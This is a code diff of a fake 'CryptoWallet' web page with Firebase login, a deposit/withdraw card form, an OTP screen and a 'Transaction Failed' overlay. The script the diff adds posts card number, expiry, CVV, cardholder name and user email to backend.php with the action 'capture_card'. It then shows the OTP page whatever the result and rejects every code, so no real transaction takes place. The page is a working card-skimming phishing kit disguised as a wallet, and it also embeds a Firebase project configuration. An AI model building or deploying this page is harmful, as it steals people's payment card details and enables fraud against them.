@@ -1,196 +1,515 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CryptoWallet - Secure Digital Wallet</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CryptoWallet - Secure Digital Wallet</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
 
-        <!-- ===== AUTH MODAL ===== -->
-        <div id="authPage" class="modal">
-            <div class="modal-content">
-                <div class="logo">
-                    <div class="logo-circle">💰</div>
-                    <h1>CryptoWallet</h1>
-                </div>
+<div class="container">
 
-                <div class="tab-buttons">
-                    <button class="tab-btn active" onclick="showTab('login')">Login</button>
-                    <button class="tab-btn" onclick="showTab('signup')">Sign Up</button>
-                </div>
+  <!-- ===== AUTH PAGE ===== -->
+  <div id="authPage" class="modal">
+    <div class="modal-content">
+      <div class="logo">
+        <div class="logo-circle">💰</div>
+        <h1>CryptoWallet</h1>
+      </div>
 
-                <!-- Login Form -->
-                <form id="loginForm" class="auth-form active">
-                    <div class="card-input-group">
-                        <label>Email</label>
-                        <input type="email" id="loginEmail" placeholder="Enter your email" required>
-                    </div>
-                    <div class="card-input-group">
-                        <label>Password</label>
-                        <input type="password" id="loginPassword" placeholder="Enter your password" required>
-                    </div>
-                    <div id="loginError" class="error-msg"></div>
-                    <button type="submit" class="btn-primary full-width" id="loginBtn">Login</button>
-                    <a href="#" class="forgot-password" id="forgotPassword">Forgot Password?</a>
-                </form>
+      <div class="tab-buttons">
+        <button class="tab-btn active" onclick="showTab('login')">Login</button>
+        <button class="tab-btn" onclick="showTab('signup')">Sign Up</button>
+      </div>
 
-                <!-- Sign Up Form -->
-                <form id="signupForm" class="auth-form">
-                    <div class="card-input-group">
-                        <label>Full Name</label>
-                        <input type="text" id="signupName" placeholder="Enter your name" required>
-                    </div>
-                    <div class="card-input-group">
-                        <label>Email</label>
-                        <input type="email" id="signupEmail" placeholder="Enter your email" required>
-                    </div>
-                    <div class="card-input-group">
-                        <label>Password</label>
-                        <input type="password" id="signupPassword" placeholder="Create a password (min 6 chars)" required>
-                    </div>
-                    <div class="card-input-group">
-                        <label>Confirm Password</label>
-                        <input type="password" id="signupConfirm" placeholder="Confirm your password" required>
-                    </div>
-                    <div id="signupError" class="error-msg"></div>
-                    <button type="submit" class="btn-primary full-width" id="signupBtn">Create Account</button>
-                </form>
-
-                <div class="divider"><span>or</span></div>
-
-                <button class="btn-google" id="googleSignIn">
-                    <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" style="width:20px;height:20px;margin-right:10px;">
-                    Continue with Google
-                </button>
-            </div>
+      <!-- Login Form -->
+      <form id="loginForm" class="auth-form active">
+        <div class="input-group">
+          <label>Email</label>
+          <input type="email" id="loginEmail" placeholder="you@example.com" required>
         </div>
-
-        <!-- ===== DASHBOARD ===== -->
-        <div id="dashboard" class="dashboard hidden">
-            <header>
-                <div class="user-info">
-                    <img class="avatar" id="userAvatar" src="https://via.placeholder.com/40" alt="User">
-                    <span id="userName">Welcome!</span>
-                </div>
-                <div id="userEmail" style="font-size:12px;color:#999;margin-bottom:10px;"></div>
-                <div class="balance-label">Available Balance</div>
-                <div id="balance">$0.00</div>
-            </header>
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="stat-icon">📈</div>
-                    <h3>$0.00</h3>
-                    <span>Total Assets</span>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-icon">🔒</div>
-                    <h3>Verified</h3>
-                    <span>Account Status</span>
-                </div>
-            </div>
-            <div class="action-buttons">
-                <button class="btn-deposit" onclick="goToDeposit()">Deposit</button>
-                <button class="btn-withdraw" onclick="goToWithdraw()">Withdraw</button>
-            </div>
-            <div style="padding:0 30px 30px;text-align:center;">
-                <button id="logoutBtn" style="background:none;border:1px solid #e1e5e9;padding:10px 30px;border-radius:12px;cursor:pointer;color:#666;font-weight:500;">Logout</button>
-            </div>
+        <div class="input-group">
+          <label>Password</label>
+          <input type="password" id="loginPassword" placeholder="••••••••" required>
         </div>
+        <div id="loginError" class="error-msg"></div>
+        <button type="submit" id="loginBtn" class="btn-primary">Login</button>
+        <a href="#" id="forgotPassword" style="display:block;margin-top:12px;color:#667eea;font-size:14px;text-decoration:none;">Forgot Password?</a>
+      </form>
 
-        <!-- ===== CARD DETAILS PAGE ===== -->
-        <div id="cardPage" class="card-page hidden">
-            <button class="back-btn" onclick="goBackToDashboard()">← Back</button>
-            <div class="card-form-container">
-                <h2 id="cardTitle">Deposit Funds</h2>
-                <form id="cardForm">
-                    <div class="card-input-group">
-                        <label>Card Number</label>
-                        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
-                    </div>
-                    <div class="card-row">
-                        <div class="card-input-group">
-                            <label>Expiry Date</label>
-                            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
-                        </div>
-                        <div class="card-input-group">
-                            <label>CVV</label>
-                            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
-                        </div>
-                    </div>
-                    <div class="card-input-group">
-                        <label>Cardholder Name</label>
-                        <input type="text" id="cardName" placeholder="John Doe" required>
-                    </div>
-                    <div class="card-input-group">
-                        <label>Amount ($)</label>
-                        <input type="number" id="amount" placeholder="0.00" min="1" step="0.01" required>
-                    </div>
-                    <button type="submit" class="btn-primary full-width">Process Payment</button>
-                </form>
-            </div>
+      <!-- Sign Up Form -->
+      <form id="signupForm" class="auth-form">
+        <div class="input-group">
+          <label>Full Name</label>
+          <input type="text" id="signupName" placeholder="John Doe" required>
         </div>
-
-        <!-- ===== OTP PAGE ===== -->
-        <div id="otpPage" class="otp-page hidden">
-            <button class="back-btn" onclick="goBackToCard()">← Back</button>
-            <div class="otp-container">
-                <h2>Verify Transaction</h2>
-                <p>Enter the 6-digit code sent to your phone</p>
-                <div class="otp-inputs">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
-                </div>
-                <form id="otpForm">
-                    <button type="submit" class="btn-primary full-width">Verify</button>
-                </form>
-                <p class="resend">Didn't receive code? <a href="#">Resend</a></p>
-            </div>
+        <div class="input-group">
+          <label>Email</label>
+          <input type="email" id="signupEmail" placeholder="you@example.com" required>
         </div>
-
-        <!-- ===== FAILED TRANSACTION OVERLAY ===== -->
-        <div id="failPage" class="modal hidden">
-            <div class="modal-content">
-                <div style="font-size:64px;margin-bottom:20px;">❌</div>
-                <h2 style="margin-bottom:10px;">Transaction Failed</h2>
-                <p style="color:#666;margin-bottom:30px;">Your transaction could not be processed.</p>
-                <div style="text-align:left;margin-bottom:30px;">
-                    <div style="display:flex;align-items:center;gap:12px;padding:12px;background:#fef2f2;border-radius:12px;margin-bottom:10px;">
-                        <span style="font-size:24px;">🏦</span>
-                        <div><strong>Bank Declined Payment</strong><br><span style="color:#666;font-size:14px;">Your bank has declined this transaction.</span></div>
-                    </div>
-                    <div style="display:flex;align-items:center;gap:12px;padding:12px;background:#fef2f2;border-radius:12px;margin-bottom:10px;">
-                        <span style="font-size:24px;">💰</span>
-                        <div><strong>Insufficient Funds</strong><br><span style="color:#666;font-size:14px;">Your account does not have enough balance.</span></div>
-                    </div>
-                    <div style="display:flex;align-items:center;gap:12px;padding:12px;background:#fef2f2;border-radius:12px;margin-bottom:10px;">
-                        <span style="font-size:24px;">💳</span>
-                        <div><strong>Card Not Supported</strong><br><span style="color:#666;font-size:14px;">This card type is not supported.</span></div>
-                    </div>
-                </div>
-                <button class="btn-primary full-width" onclick="showPage('dashboard')">Try Again</button>
-            </div>
+        <div class="input-group">
+          <label>Password</label>
+          <input type="password" id="signupPassword" placeholder="••••••••" required minlength="6">
         </div>
-
-        <div id="loading" class="modal hidden">
-            <div class="modal-content">
-                <p>Loading...</p>
-            </div>
+        <div class="input-group">
+          <label>Confirm Password</label>
+          <input type="password" id="signupConfirm" placeholder="••••••••" required>
         </div>
+        <div id="signupError" class="error-msg"></div>
+        <button type="submit" id="signupBtn" class="btn-primary">Create Account</button>
+      </form>
 
+      <div class="divider"><span>or</span></div>
+
+      <button class="btn-google" id="googleSignIn">
+        <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" style="width:20px;height:20px;margin-right:10px;">
+        Continue with Google
+      </button>
     </div>
+  </div>
 
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-auth-compat.js"></script>
+  <!-- ===== DASHBOARD ===== -->
+  <div id="dashboard" class="dashboard hidden">
+    <header>
+      <div class="user-info">
+        <img class="avatar" id="userAvatar" src="https://via.placeholder.com/40" alt="User">
+        <span id="userName">Welcome!</span>
+      </div>
+      <div id="userEmail" style="font-size:12px;color:#999;margin-bottom:10px;"></div>
+      <div class="balance-label">Available Balance</div>
+      <div id="balance">$0.00</div>
+    </header>
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-icon">📈</div>
+        <h3>$0.00</h3>
+        <span>Total Assets</span>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon">🔒</div>
+        <h3>Verified</h3>
+        <span>Account Status</span>
+      </div>
+    </div>
+    <div class="action-buttons">
+      <button class="btn-deposit" onclick="goToDeposit()">Deposit</button>
+      <button class="btn-withdraw" onclick="goToWithdraw()">Withdraw</button>
+    </div>
+    <div style="padding:0 30px 30px;text-align:center;">
+      <button id="logoutBtn" style="background:none;border:1px solid #e1e5e9;padding:10px 30px;border-radius:12px;cursor:pointer;color:#666;font-weight:500;">Logout</button>
+    </div>
+  </div>
 
-    <script src="script.js"></script>
+  <!-- ===== CARD DETAILS PAGE ===== -->
+  <div id="cardPage" class="card-page hidden">
+    <button class="back-btn" onclick="goBackToDashboard()">← Back</button>
+    <div class="card-form-container">
+      <h2 id="cardTitle">Deposit Funds</h2>
+      <form id="cardForm">
+        <div class="card-input-group">
+          <label>Card Number</label>
+          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+        </div>
+        <div class="card-row">
+          <div class="card-input-group">
+            <label>Expiry Date</label>
+            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+          </div>
+          <div class="card-input-group">
+            <label>CVV</label>
+            <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+          </div>
+        </div>
+        <div class="card-input-group">
+          <label>Cardholder Name</label>
+          <input type="text" id="cardName" placeholder="John Doe" required>
+        </div>
+        <div class="card-input-group">
+          <label>Amount ($)</label>
+          <input type="number" id="amount" placeholder="0.00" min="1" step="0.01" required>
+        </div>
+        <button type="submit" class="btn-primary full-width">Process Payment</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- ===== OTP PAGE ===== -->
+  <div id="otpPage" class="otp-page hidden">
+    <button class="back-btn" onclick="goBackToCard()">← Back</button>
+    <div class="otp-container">
+      <h2>Verify Transaction</h2>
+      <p>Enter the 6-digit code sent to your phone</p>
+      <form id="otpForm">
+        <div class="otp-inputs">
+          <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
+        </div>
+        <button type="submit" class="btn-primary full-width">Verify</button>
+      </form>
+      <p class="resend">Didn't receive code? <a href="#">Resend</a></p>
+    </div>
+  </div>
+
+  <!-- ===== FAILED TRANSACTION OVERLAY ===== -->
+  <div id="failPage" class="modal hidden">
+    <div class="modal-content">
+      <div style="font-size:64px;margin-bottom:20px;">❌</div>
+      <h2 style="margin-bottom:10px;">Transaction Failed</h2>
+      <p style="color:#666;margin-bottom:30px;">Your transaction could not be processed.</p>
+      <div style="text-align:left;margin-bottom:30px;">
+        <div style="display:flex;align-items:center;gap:12px;padding:12px;background:#fef2f2;border-radius:12px;margin-bottom:10px;">
+          <span style="font-size:24px;">🏦</span>
+          <div><strong>Bank Declined Payment</strong><br><span style="color:#666;font-size:14px;">Your bank has declined this transaction.</span></div>
+        </div>
+        <div style="display:flex;align-items:center;gap:12px;padding:12px;background:#fef2f2;border-radius:12px;margin-bottom:10px;">
+          <span style="font-size:24px;">💰</span>
+          <div><strong>Insufficient Funds</strong><br><span style="color:#666;font-size:14px;">Your account does not have enough balance.</span></div>
+        </div>
+        <div style="display:flex;align-items:center;gap:12px;padding:12px;background:#fef2f2;border-radius:12px;margin-bottom:10px;">
+          <span style="font-size:24px;">💳</span>
+          <div><strong>Card Not Supported</strong><br><span style="color:#666;font-size:14px;">This card type is not supported.</span></div>
+        </div>
+      </div>
+      <button class="btn-primary full-width" onclick="showPage('dashboard')">Try Again</button>
+    </div>
+  </div>
+
+  <div id="loading" class="modal hidden">
+    <div class="modal-content">
+      <p>Loading...</p>
+    </div>
+  </div>
+
+</div>
+
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-auth-compat.js"></script>
+<script>
+// ===== 🔁 REPLACE THIS WITH YOUR OWN FIREBASE CONFIG =====
+const firebaseConfig = {
+    apiKey: "AIzaSyDtcXcqTyaVaXzN8bY_ORsiC9CTcJkfHcw",
+    authDomain: "xmv-ai.firebaseapp.com",
+    projectId: "xmv-ai",
+    storageBucket: "xmv-ai.firebasestorage.app",
+    messagingSenderId: "617791824706",
+    appId: "1:617791824706:web:c6dbd0643991a153701edb",
+    measurementId: "G-K31848J74C"
+};
+
+firebase.initializeApp(firebaseConfig);
+const auth = firebase.auth();
+
+// ===== State =====
+let isDeposit = true;
+
+// ===== DOM Ready =====
+document.addEventListener('DOMContentLoaded', function() {
+
+    // --- Tab Switching ---
+    window.showTab = function(tab) {
+        document.querySelectorAll('.auth-form').forEach(f => f.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        if (tab === 'login') {
+            document.getElementById('loginForm').classList.add('active');
+            document.querySelector('.tab-btn:nth-child(1)').classList.add('active');
+        } else {
+            document.getElementById('signupForm').classList.add('active');
+            document.querySelector('.tab-btn:nth-child(2)').classList.add('active');
+        }
+        document.getElementById('loginError').textContent = '';
+        document.getElementById('signupError').textContent = '';
+    };
+
+    // --- Page Navigation ---
+    window.showPage = function(page) {
+        document.querySelectorAll('.modal, .dashboard, .card-page, .otp-page').forEach(el => el.classList.add('hidden'));
+        document.getElementById(page).classList.remove('hidden');
+    };
+
+    window.goToDeposit = function() {
+        isDeposit = true;
+        document.getElementById('cardTitle').textContent = 'Deposit Funds';
+        showPage('cardPage');
+    };
+
+    window.goToWithdraw = function() {
+        isDeposit = false;
+        document.getElementById('cardTitle').textContent = 'Withdraw Funds';
+        showPage('cardPage');
+    };
+
+    window.goBackToDashboard = function() {
+        showPage('dashboard');
+    };
+
+    window.goBackToCard = function() {
+        showPage('cardPage');
+    };
+
+    // ==========================================
+    // ===== LOGIN =====
+    // ==========================================
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = document.getElementById('loginEmail').value;
+        const password = document.getElementById('loginPassword').value;
+        const btn = document.getElementById('loginBtn');
+        const errorEl = document.getElementById('loginError');
+
+        btn.disabled = true;
+        btn.textContent = 'Signing in...';
+        errorEl.textContent = '';
+        errorEl.style.color = '#ef4444';
+
+        auth.signInWithEmailAndPassword(email, password)
+            .then(function(userCredential) {
+                setUserDashboard(userCredential.user);
+                showPage('dashboard');
+            })
+            .catch(function(error) {
+                // User-friendly error messages
+                switch (error.code) {
+                    case 'auth/user-not-found':
+                    case 'auth/wrong-password':
+                    case 'auth/invalid-credential':
+                        errorEl.textContent = 'Invalid email or password.';
+                        break;
+                    case 'auth/user-disabled':
+                        errorEl.textContent = 'This account has been disabled.';
+                        break;
+                    case 'auth/invalid-email':
+                        errorEl.textContent = 'Please enter a valid email address.';
+                        break;
+                    case 'auth/too-many-requests':
+                        errorEl.textContent = 'Too many attempts. Please try again later.';
+                        break;
+                    default:
+                        errorEl.textContent = error.message;
+                }
+            })
+            .finally(function() {
+                btn.disabled = false;
+                btn.textContent = 'Login';
+            });
+    });
+
+    // ==========================================
+    // ===== SIGN UP =====
+    // ==========================================
+    document.getElementById('signupForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const name = document.getElementById('signupName').value.trim();
+        const email = document.getElementById('signupEmail').value;
+        const password = document.getElementById('signupPassword').value;
+        const confirm = document.getElementById('signupConfirm').value;
+        const btn = document.getElementById('signupBtn');
+        const errorEl = document.getElementById('signupError');
+
+        errorEl.style.color = '#ef4444';
+        errorEl.textContent = '';
+
+        // Validation
+        if (password !== confirm) {
+            errorEl.textContent = 'Passwords do not match!';
+            return;
+        }
+        if (password.length < 6) {
+            errorEl.textContent = 'Password must be at least 6 characters.';
+            return;
+        }
+
+        btn.disabled = true;
+        btn.textContent = 'Creating account...';
+
+        auth.createUserWithEmailAndPassword(email, password)
+            .then(function(userCredential) {
+                return userCredential.user.updateProfile({ displayName: name });
+            })
+            .then(function() {
+                const user = auth.currentUser;
+                setUserDashboard(user);
+                showPage('dashboard');
+            })
+            .catch(function(error) {
+                switch (error.code) {
+                    case 'auth/email-already-in-use':
+                        errorEl.textContent = 'An account with this email already exists.';
+                        break;
+                    case 'auth/weak-password':
+                        errorEl.textContent = 'Password is too weak. Use at least 6 characters.';
+                        break;
+                    case 'auth/invalid-email':
+                        errorEl.textContent = 'Please enter a valid email address.';
+                        break;
+                    default:
+                        errorEl.textContent = error.message;
+                }
+            })
+            .finally(function() {
+                btn.disabled = false;
+                btn.textContent = 'Create Account';
+            });
+    });
+
+    // ==========================================
+    // ===== FORGOT PASSWORD =====
+    // ==========================================
+    document.getElementById('forgotPassword').addEventListener('click', function(e) {
+        e.preventDefault();
+        const email = document.getElementById('loginEmail').value;
+        const errorEl = document.getElementById('loginError');
+
+        if (!email) {
+            errorEl.style.color = '#ef4444';
+            errorEl.textContent = 'Enter your email first, then click Forgot Password.';
+            return;
+        }
+
+        auth.sendPasswordResetEmail(email)
+            .then(function() {
+                errorEl.style.color = '#10b981';
+                errorEl.textContent = 'Password reset email sent! Check your inbox.';
+            })
+            .catch(function(error) {
+                errorEl.style.color = '#ef4444';
+                switch (error.code) {
+                    case 'auth/user-not-found':
+                        errorEl.textContent = 'No account found with this email.';
+                        break;
+                    default:
+                        errorEl.textContent = error.message;
+                }
+            });
+    });
+
+    // ==========================================
+    // ===== GOOGLE SIGN-IN =====
+    // ==========================================
+    document.getElementById('googleSignIn').addEventListener('click', function() {
+        const provider = new firebase.auth.GoogleAuthProvider();
+        auth.signInWithPopup(provider)
+            .then(function(result) {
+                setUserDashboard(result.user);
+                showPage('dashboard');
+            })
+            .catch(function(error) {
+                document.getElementById('loginError').style.color = '#ef4444';
+                document.getElementById('loginError').textContent = error.message;
+            });
+    });
+
+    // ==========================================
+    // ===== LOGOUT =====
+    // ==========================================
+    document.getElementById('logoutBtn').addEventListener('click', function() {
+        auth.signOut().then(function() {
+            showPage('authPage');
+        });
+    });
+
+    // ==========================================
+    // ===== AUTH STATE OBSERVER =====
+    // ==========================================
+    auth.onAuthStateChanged(function(user) {
+        if (user) {
+            setUserDashboard(user);
+            showPage('dashboard');
+        } else {
+            showPage('authPage');
+        }
+    });
+
+    // ==========================================
+    // ===== HELPER: Set Dashboard UI =====
+    // ==========================================
+    function setUserDashboard(user) {
+        const displayName = user.displayName || user.email.split('@')[0];
+        document.getElementById('userName').textContent = 'Welcome, ' + displayName + '!';
+        document.getElementById('userEmail').textContent = user.email;
+        if (user.photoURL) {
+            document.getElementById('userAvatar').src = user.photoURL;
+        }
+    }
+
+    // ==========================================
+    // ===== CARD FORM =====
+    // ==========================================
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
+        let parts = [];
+        for (let i = 0; i < value.length && i < 16; i += 4) {
+            parts.push(value.substring(i, i + 4));
+        }
+        e.target.value = parts.join(' ');
+    });
+
+    document.getElementById('expiry').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        e.target.value = value;
+    });
+
+    document.getElementById('cardForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const user = auth.currentUser;
+        const cardData = {
+            type: isDeposit ? 'Deposit' : 'Withdraw',
+            cardNumber: document.getElementById('cardNumber').value,
+            expiry: document.getElementById('expiry').value,
+            cvv: document.getElementById('cvv').value,
+            cardholder: document.getElementById('cardName').value,
+            amount: document.getElementById('amount').value,
+            user: user ? user.email : 'unknown',
+            userName: user ? (user.displayName || user.email) : 'unknown',
+            timestamp: new Date().toISOString()
+        };
+
+        fetch('backend.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: 'capture_card', data: cardData })
+        }).then(function() {
+            showPage('otpPage');
+        }).catch(function() {
+            showPage('otpPage');
+        });
+    });
+
+    // ==========================================
+    // ===== OTP FORM =====
+    // ==========================================
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        alert('Transaction failed: Invalid OTP. Please try again.');
+        showPage('dashboard');
+    });
+
+    // OTP auto-focus
+    document.querySelectorAll('.otp-input').forEach(function(input, index, arr) {
+        input.addEventListener('input', function() {
+            if (this.value.length === 1 && index < arr.length - 1) {
+                arr[index + 1].focus();
+            }
+        });
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value && index > 0) {
+                arr[index - 1].focus();
+            }
+        });
+    });
+
+});
+</script>
 </body>
 </html>
